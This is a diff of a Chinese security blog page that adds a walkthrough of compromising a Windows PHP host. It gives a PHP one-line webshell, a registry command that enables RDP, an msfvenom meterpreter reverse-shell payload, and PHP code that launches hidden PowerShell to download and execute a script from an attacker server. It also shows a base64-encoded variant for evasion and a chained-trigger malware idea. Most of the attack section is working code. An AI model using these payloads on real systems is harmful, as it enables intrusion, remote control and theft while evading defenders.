@@ -9,18 +9,30 @@
   
   <title>用PHP环境调用powershell弹个shell | 大魔王</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="这是一篇奇葩瞎搞文 准备windows10 PHPv7.3.1 Metasploit">
+  <meta name="description" content="这是一篇奇葩瞎搞文 准备：windows10 PHPv7.3.1 Metasploit">
 <meta property="og:type" content="article">
 <meta property="og:title" content="用PHP环境调用powershell弹个shell">
 <meta property="og:url" content="http://ljg.dropsec.xyz/2020/01/13/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/index.html">
 <meta property="og:site_name" content="大魔王">
-<meta property="og:description" content="这是一篇奇葩瞎搞文 准备windows10 PHPv7.3.1 Metasploit">
-<meta property="og:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/%E6%8B%93%E6%89%91.png">
+<meta property="og:description" content="这是一篇奇葩瞎搞文 准备：windows10 PHPv7.3.1 Metasploit">
+<meta property="og:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/%E6%8B%93%E6%89%91%E5%9B%BE.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/muma.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/3389.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/web.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/powershell.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/%E5%8F%8C%E5%BC%95%E5%8F%B7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/success.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/hello.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/success1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/fire.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/powershellbase64.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/duominuo.png">
 <meta property="article:published_time" content="2020-01-13T03:38:16.000Z">
-<meta property="article:modified_time" content="2020-01-13T07:19:27.908Z">
+<meta property="article:modified_time" content="2020-01-13T18:29:45.879Z">
 <meta property="article:author" content="breakonion">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/%E6%8B%93%E6%89%91.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/%E6%8B%93%E6%89%91%E5%9B%BE.png">
   
     <link rel="alternative" href="/atom.xml" title="大魔王" type="application/atom+xml">
   
@@ -303,13 +315,50 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>这是一篇奇葩瞎搞文 准备windows10 PHPv7.3.1 Metasploit</p>
+        <p>这是一篇奇葩瞎搞文 准备：windows10 PHPv7.3.1 Metasploit</p>
 <a id="more"></a>
 <p>&lt;The rest of contents | 余下全文&gt;</p>
 <h2 id="1、序言"><a href="#1、序言" class="headerlink" title="1、序言"></a>1、序言</h2><p>　　如果说我为什么想起用PHP调用powershell,我想一定是因为我的“盲目自信造成的可怕结果”。总之这是一个很搞笑的经历，花了我很长时间最终证明我是个“fool b”哈哈哈下面我就来书写下这个让我自己都不自觉笑出声的经历。当然故事吗，因为是一个月前的事了，我就能想起多少就写多少，我只要看这篇文的人能在快乐中有自己的想法，当然我在写这篇文的时候我相信对我自己还是会有一些新的想法诞生的。下面就开始“自我反省”。</p>
-<h2 id="2、故事第一章–“奇想”"><a href="#2、故事第一章–“奇想”" class="headerlink" title="2、故事第一章–“奇想”"></a>2、故事第一章–“奇想”</h2><p>　　说真的我一直觉得自己很菜，自己平时工作不忙的时候就喜欢自己看点攻防的相关知识。看来看去总是没有心意，都是老套路。大致思路如下，找个漏洞，像命令执行这样的。windows下开个3389，关个防火墙，好吗，各种工具，看着大神们用的各种神器仿佛开了挂一样。但是我觉得这样不好，因为这样不够隐蔽。所以我想在不过多依赖工具的情况下完成打点工作。</p>
-<h2 id="3、故事第二章–“剧本”"><a href="#3、故事第二章–“剧本”" class="headerlink" title="3、故事第二章–“剧本”"></a>3、故事第二章–“剧本”</h2><p><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/%E6%8B%93%E6%89%91.png" alt=""><br>　　目标是一台Windows主机（这一点就很傻，哈哈哈），我想要做的事就是远程关闭此主机的防火墙以及用powershell反弹一个shell。暂时先不考虑什么免杀的。</p>
-<p>　　</p>
+<h2 id="2、故事第一章–“奇想”"><a href="#2、故事第一章–“奇想”" class="headerlink" title="2、故事第一章–“奇想”"></a>2、故事第一章–“奇想”</h2><p>　　说真的我一直觉得自己很菜，自己平时工作不忙的时候就喜欢自己看点攻防的相关知识。看来看去总是没有新意，都是老套路。大致思路如下，找个漏洞，像命令执行这样的。windows下开个3389，关个防火墙，好吗，各种工具，看着大神们用的各种神器仿佛开了挂一样。但是我觉得这样不好，因为这样不够隐蔽。所以我想在不过多依赖工具的情况下完成打点工作。</p>
+<h2 id="3、故事第二章–“剧本”"><a href="#3、故事第二章–“剧本”" class="headerlink" title="3、故事第二章–“剧本”"></a>3、故事第二章–“剧本”</h2><p><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/%E6%8B%93%E6%89%91%E5%9B%BE.png" alt=""><br>　　<br>   目标是一台Windows主机（这一点就很傻，哈哈哈），我想要做的事就是远程关闭此主机的防火墙以及用powershell反弹一个shell。暂时先不考虑什么免杀的。当然想执行上面的操作得有个漏洞能够让你插马，这里我就假设已经插马成功了。先别急着吐槽，有人可能觉得都插马成功了，你找个功能强大的大马传上去不就行了。抱歉我知道那很可以，JOJO:但是我拒绝！ 马大了，容易被发现频繁的主动回连也会增加暴露的可能性！与此相反我更喜欢类似于一句话的被动式木马。所以本篇依然从被动式木马开始，反弹的powershell被防守方抓到也无所谓。</p>
+<h3 id="①环境配置"><a href="#①环境配置" class="headerlink" title="①环境配置"></a>①环境配置</h3><p>　　1. 启用受害机的PHPstudy环境。</br><br>　　2. 攻击机器带hackbar(能提交POST请求的工具都可以)的firefox </br><br>　　3. 安装有metasploit的PC（这里选了kali linux）</br></p>
+<h3 id="②开始排练"><a href="#②开始排练" class="headerlink" title="②开始排练"></a>②开始排练</h3><p>　　1. 武器构建</br><br>　　前边已经说了，我要用PHP环境调用powershell。那么该怎么调用呢？在调用powershell之前，我还希望通过一些远程命令来关掉目标的防火墙。所以我们要逐层突防，不要太急功近利。所以此处先掏出”大杀器”通过特殊处理的一句话木马,让管理员放松警惕，觉得你是个小垃圾。<?php system($_POST["onino"]);?>,虽然它很短，但是我觉得它很容易就被变形和隐藏。参见<a href="https://www.freebuf.com/articles/web/186298.html" target="_blank" rel="noopener" title="无字母和数字的webshell">https://www.freebuf.com/articles/web/186298.html</a>。此处很单纯的一句话和一个hackbar就可以完成数据传输（此处还有提升空间，采取加密通信！）远程开启和关闭windows的防火墙,开启3389端口。<br><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/muma.png" alt=""></p>
+<pre><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f /*开启3389端口*/</code></pre> 
+<p><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/3389.png" alt=""><br>　　以上就是通过简单的命令配合一句话木马达到控制远端受害机器的防火墙、3389端口等策略。接下来就可以采取多种策略和攻击方式做下一步工作。比如远程连接3389，直接手工投毒，哈哈哈 当然这样太无趣又乏味了。 我要按照剧本走，通过浏览器发送指令然后，调用powershell发起无文件攻击。<br>　　</br><br>　　首先这里先用metasploit生成攻击载荷,并将此攻击载荷放到攻击载荷服务器的WEB目录下。</p>
+<pre><code>root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.164.143 LPORT=8888 -f psh-reflection >per.ps1
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7.png" alt=""></br><br><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/web.png" alt=""><br>　　</br><br>　　这时候侦听的环境都已经准备就绪，并且poweshell要执行的恶意载荷也已经具备，那么该怎么样才能将载荷投递到目标主机呢？既然一句话木马能执行系统命令，那么通过cmd来调用powershell进而让powershell从攻击载荷服务器下载恶意脚本per.ps1并执行就可以了。那么就剩下最关键的一步。剧本假设的是php环境，就得按规矩走，要通过powershell来执行。这当然难不倒我，瞬间我就有了主意构建了武器核心。</p>
+<pre><code>
+system('cmd /c powershell.exe -sta -W Hidden -c IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.164.147/per.ps1'))');
+</code></pre>
+<p>　　这条命令看起来不错，先在本地尝试执行试试。这时候就会面对PHP环境对于单引号以及双引号的闭合的尴尬。下图中的单引号①号和②号闭合了。③号和④号的字符串直接无效。 我所期望的是希望②号和③号先闭合这样powershell这样Downloadstring后面的url才能被当成字符串执行。 当然把①号和④号换成双引号在编译器执行测试是可以反弹shell的。<br><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/powershell.png" alt=""></br></p>
+<p><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/%E5%8F%8C%E5%BC%95%E5%8F%B7.png" alt=""></br></p>
+<p><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/success.png" alt=""><br></br><br>　　2. 载荷投递</br><br>　　武器构建好了，传到受害机器上，通过浏览器触发试试能不能反弹shell。令人惊讶的是这次竟然莫名奇妙地成功地反弹了shell。我反而开心不起来，因为一个月前我可是从来没有成功过，或许是因为我用的metsploit的问题。<br><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/hello.png" alt=""></br><br><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/success1.png" alt=""></br><br>　　看到这里你可能会觉得这个家伙真的蠢，哈哈哈。but,我并不会因你快乐的笑声而感到自卑。因为弯路让我得到了更多。 你瞧，虽然上图中访问hello.php服务器返回了500，但是shell依然反弹成功了。(所以说从服务器状态码判断攻击者的成功与否太具有局限性)。多好的弯路啊，除此之外它还使我在不使用双引号的情况下，达到了我新武器的构建。我们来看我的新武器。</br></p>
+<pre><code>&lt;?php
+ system (&apos;powershell -ep bypass -NoLogo -NonInteractive -sta -W Hidden -NoProfile -enc SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQA2ADQALgAxADQANwAvAHAAZQByAC4AcABzADEAJwApACkA&apos;);
+?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/fire.png" alt=""></br></p>
+<p>　　嚯又是一个烂大街的代码，哈哈哈。都烂大街了，为什么还要放在这里呢? 因为恰恰是这段代码让人了解到，这个世界上base64编码分两类。 powershell可以执行的，以及powershell不能执行的’SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQA2ADQALgAxADQANwAvAHAAZQByAC4AcABzADEAJwApACkA’这串字符是通过powershell脚本进行base64加密的。</p>
+<pre><code>加密前:
+&lt;?php
+system (&apos;powershell -ep bypass -NoLogo -NonInteractive -sta -W Hidden -NoProfile -c IEX((New-Object System.Net.WebClient).DownloadString(&apos;http://192.168.164.147/per.ps1&apos;));
+?&gt;
+加密后：
+&lt;?php
+system (&apos;powershell -ep bypass -NoLogo -NonInteractive -sta -W Hidden -NoProfile -enc SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQA2ADQALgAxADQANwAvAHAAZQByAC4AcABzADEAJwApACkA&apos;);
+?&gt;</code></pre><p>　　这里我想说的是无论你是通过常见的base64工具还是编程输出的base64加密字符串，在powershell里面执行都会报错。正确的途径，当然是采用逆向思维，通过powershell加密字符串就可以了。</p>
+<pre><code>powershell-base64:
+$fileContent = “所要编码的脚本”
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($fileContent)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+echo $encodedCommand</code></pre><p><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/powershellbase64.png" alt=""></br></p>
+<p>　　<br/><br>　　ops:除此之外，我还找到了另外一个比较有趣的网络攻击思路，有点类似于多米诺骨牌。<br>在我初次遇到单引号问题苦苦不能解决的时候，随着我的调整，我在本地成功执行了脚本并成功反弹了shell。但是当我把文件传到受害机器时却一直失败。我想到了通过post传参数的方式来将’cmd /c powershell.exe -sta -W Hidden -c IEX((New-Object System.Net.WebClient).DownloadString(‘<a href="http://192.168.164.147/per.ps1&#39;))&#39;当作参数来执行，结果依然不理想。" target="_blank" rel="noopener">http://192.168.164.147/per.ps1&#39;))&#39;当作参数来执行，结果依然不理想。</a> 我排查了各个环节，最终突然开窍，何必那么纠结于环境。于是我就在上传木马脚本文件之外，还上传了一个触发文件来模仿人输入CMD命令，主动点击执行木马脚本。这样就可以排除环境以及通信问题了。</p>
+<p><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/duominuo.png" alt=""></br></p>
+<p>唔~ 写到这里我的心思已经完全不在什么powershell以及php怎么触发等等。 有这样一种木马触发方式    </p>
+<pre><code>文件是可以触发的，木马是一些代码。 那么我想会有一种木马，在它真正启动之前会有N个未知的触发文件。这些触发文件每个单体都令人看不懂意图，在最终的木马触发之前人们看不懂它，它们像一个个多米诺骨牌连环被触发，这个过程的时间周期是攻击者可控的可以是几秒钟，一小时甚至几年，但最终不管哪一个被触发都会最终触发最终的木马。ps:代码积木，触发文件自启式拼组木马。 </code></pre></br>
+　　3. 命令控制
+　　此处暂且不写，以此为引我将继续探索，将我在路上的趣事不断地写在这里。
+　
+######### 5月27 10月5 12月27 &today
 
       
     </div>
@@ -321,7 +370,7 @@
         <p><span>本文标题:</span><a  href="/2020/01/13/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/">用PHP环境调用powershell弹个shell</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问 breakonion 的个人博客">breakonion</a></p>
         <p><span>发布时间:</span>2020年01月13日 - 11时38分</p>
-        <p><span>最后更新:</span>2020年01月13日 - 15时19分</p>
+        <p><span>最后更新:</span>2020年01月14日 - 02时29分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2020/01/13/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/" title="用PHP环境调用powershell弹个shell">http://ljg.dropsec.xyz/2020/01/13/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/</a>
             <span class="copy-path" data-clipboard-text="原文: http://ljg.dropsec.xyz/2020/01/13/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/　　作者: breakonion" title=""></span>
@@ -349,7 +398,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1、序言"><span class="toc-number">1.</span> <span class="toc-text">1、序言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2、故事第一章–“奇想”"><span class="toc-number">2.</span> <span class="toc-text">2、故事第一章–“奇想”</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3、故事第二章–“剧本”"><span class="toc-number">3.</span> <span class="toc-text">3、故事第二章–“剧本”</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1、序言"><span class="toc-number">1.</span> <span class="toc-text">1、序言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2、故事第一章–“奇想”"><span class="toc-number">2.</span> <span class="toc-text">2、故事第一章–“奇想”</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3、故事第二章–“剧本”"><span class="toc-number">3.</span> <span class="toc-text">3、故事第二章–“剧本”</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#①环境配置"><span class="toc-number">3.1.</span> <span class="toc-text">①环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#②开始排练"><span class="toc-number">3.2.</span> <span class="toc-text">②开始排练</span></a></li></ol></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
